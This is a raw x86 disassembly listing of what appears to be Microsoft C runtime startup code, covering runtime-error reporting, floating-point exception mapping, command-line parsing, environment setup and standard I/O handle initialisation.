  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
